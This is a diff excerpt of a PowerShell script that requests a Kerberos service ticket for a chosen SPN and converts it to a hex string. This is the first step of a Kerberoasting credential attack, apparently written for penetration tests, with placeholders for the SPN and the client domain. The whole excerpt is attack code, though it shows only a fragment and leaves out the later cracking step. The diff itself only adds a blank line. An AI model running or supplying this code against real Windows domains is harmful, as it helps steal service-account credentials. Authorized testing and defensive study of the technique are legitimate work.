@@ -1,6 +1,7 @@
 Add-Type -AssemblyName System.IdentityModel
 $UserSPN = '<add spn here>'
 $Domain = '<client domain goes here>'
+
 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
 $TicketByteStream = $Ticket.GetRequest()
 $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
